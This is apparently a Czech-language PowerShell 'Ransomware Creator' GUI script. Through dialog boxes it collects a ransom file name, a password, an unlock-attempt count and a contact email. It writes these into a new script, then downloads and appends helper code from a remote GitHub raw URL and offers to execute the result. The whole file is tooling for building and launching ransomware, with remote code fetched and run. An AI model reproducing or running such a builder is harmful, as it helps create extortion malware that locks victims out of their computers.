#Rand GUI based: Using VS Basic

Import-Module Microsoft.PowerShell.Management
Import-Module Microsoft.PowerShell.Utility
#  _________________________________________________
#/                                                   \
#|      s GUI & PowerShell přepsání pomohl JPmanOF    |
#\                                                   /
#  ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅  ̅

#--------TODO------------
#21.08.2024 13:10:19 Add errorbox to creatorhelpercheck
#21.08.2024 14:01:45 Add errorbox to errors
#
#Ransonware creator
$creatorName = '.\creator.ps1'
$DefaultPassword = 1234
$DefaultAttempts = 3
$DefaultName = "output" + ".ps1"
$DefaultEmail = "hakransom@post.cz"
$helper = "https://raw.githubusercontent.com/jakub-petrovic/virusk/main/Creator-Helper.ps1"
$blank = ""
#-----------------Script for inputbox-----------------
#& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte email nebo dejte OK (default email: $DefaultEmail)", 'Ransonware Creator GUI V0.1')}
#-----------------Script for messagebox------------------
#& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Hello World', 'This is an example', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}

Clear-Host
#Check if creator helper exists
#if (Test-Path $helper) {
#    Write-Host ""
#}
#else {
#    Write-Host "Ujistete se ze $helper existuje a je ve stejné složce jako $creatorName"
#    Write-Host "Pokud jste se ujistili muzete napsat na $DefaultEmail"
#    Pause
#}



#udaje -->
$OutputName = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte jméno ransomwaru nebo dejte OK (výchozí jméno: $DefaultName):", 'Ransonware Creator GUI V0.1')}
if ($OutputName -eq $blank){$OutputName = $DefaultName}



$password = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Vytvořte heslo nebo dejte OK (výchozí heslo: $DefaultPassword)", 'Ransonware Creator GUI V0.1')}
if ($password -eq $blank){$password = $DefaultPassword}

$attempts = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte kolik pokusů je na odemčení počítače (výchozích pokusů: $DefaultAttempts)", 'Ransonware Creator GUI V0.1')}
if ($attempts -eq $blank){$attempts = $DefaultAttempts}

$Email = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte email nebo dejte OK (výchozí email: $DefaultEmail)", 'Ransonware Creator GUI V0.1')}
if ($Email -eq $blank){$Email = $DefaultEmail}


#21.08.2024 13:52:09 EchoOffVariable is variable used only so it doesnt type out somenthing, IDK if I will understand this after some time but, yeah
#Pause
Clear-Host
Add-Type -AssemblyName System.Windows.Forms

$message = @"
/----------------------------------------\
|Ověřte údaje které jste zadali|
\----------------------------------------/


Jméno souboru: $OutputName
Heslo: $password
Pokusy: $attempts
Email: $Email
"@

[System.Windows.Forms.MessageBox]::Show($message, 'Ověření', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)


#Write-Host "/------------------------------\"
#Write-Host "|Ověřte údaje které jste zadali|"
#Write-Host "\------------------------------/"
#Write-Host ""
#Write-Host "Jméno souboru: $OutputName"
#Write-Host "Heslo: $password"
#Write-Host "Pokusy: $attempts"
#Write-Host "Email: $Email"
#Write-Host ""
#pause

#Nezapomen ze v tomhle kodu nikde nesmí být PAUSE !!! Ještě jednou ho někam dáš a zase bude uživatel muset použít konzoli!!!

#Confirm + Create
function confirm {
$confirm = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Jsou tyto údaje správné?", 'Ověření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}

if ($confirm -eq "Yes" -or $confirm -eq $blank){
    ('$password' + "=" + '"' + "$password" + '"') | Set-Content .\$OutputName
    ('$attempts' + "=" + "$attempts") | Add-Content .\$OutputName
    ('$email' + "=" + '"' + "$Email" + '"') | Add-Content .\$OutputName
    Clear-Host
    $createdYN = Test-Path .\$OutputName
    if ($createdYN) {
    & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Ransonware byl úspěšně vytvořen!", 'Vytvořeno!', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
    #Write-Host "Ransonware byl uspesne vytvoren"
    $EchoOffVariable = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Jméno: $OutputName", 'Vytvořeno!', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
    #Write-Host "$OutputName Ransonware vytvořen."
    }
    else {
        Write-Host "ALE NEE... NECO SE POKAZILO"
        Write-Host "---------------------------"
        Write-Host "Script nemohl byt vytvoren z nejakeho duvodu D:"
    }
}
elseif ($confirm -eq "No"){
    exit
}
else {
    . $creatorName
}
}
confirm
$request = Invoke-WebRequest -Uri $helper
$request.Content | Add-Content -Path .\$OutputName



#otevrit script (Y\N)
$open = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Chcete otevřít script $OutputName?", 'Otevření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
if ($open -eq "Yes") {
. .\$OutputName
}


elseif ($open -eq "No") {
#vytvorit dalsi script (Y\N)
$dalsi = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Chcete vytvořit další ransomware?", 'Vytvořit', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
    if ($dalsi -eq "Yes") {. $creatorName}
    else {exit}
}

else {exit}



#https://medium.com/swlh/how-to-enhance-your-windows-batch-files-by-adding-gui-7287d89ebad6
